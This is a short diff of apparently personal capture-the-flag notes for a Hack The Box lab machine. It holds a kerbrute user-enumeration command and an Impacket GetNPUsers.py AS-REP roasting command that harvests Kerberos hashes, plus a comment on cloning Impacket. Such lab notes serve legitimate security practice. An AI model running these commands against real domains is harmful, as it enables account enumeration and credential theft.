@@ -2,4 +2,13 @@ kerbrute:
 kerbrute userenum --dc 10.129.96.197 -d freelancer.htb usernames.txt
 
 GetNPUsers.py:
+/*
+Clone the Impacket Repository:
+git clone https://github.com/fortra/impacket.git
+cd impacket/examples
+Locate the Script: The GetNPUsers.py script will be in the examples/ directory.
+*/
+
 GetNPUsers.py freelancer.htb/ -dc-ip 10.129.96.197 -usersfile usernames.txt -outputfile hashes.txt
+
+
